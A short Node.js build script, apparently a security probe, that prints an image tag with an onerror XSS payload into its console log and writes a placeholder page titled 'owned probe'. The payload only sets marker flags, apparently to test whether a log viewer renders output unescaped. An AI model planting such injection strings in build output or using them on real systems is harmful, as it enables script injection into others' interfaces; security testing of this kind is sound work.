const fs = require('fs');
console.log(`<img src=x onerror="window.__CREATE_LOG_XSS_PROBE__=\'confirmed\';document.documentElement.dataset.createLogXss=\'confirmed\'">`);
fs.mkdirSync('dist', {recursive:true});
fs.writeFileSync('dist/index.html','<!doctype html><title>owned probe</title><p>ok</p>');
console.log('probe-build-ready');
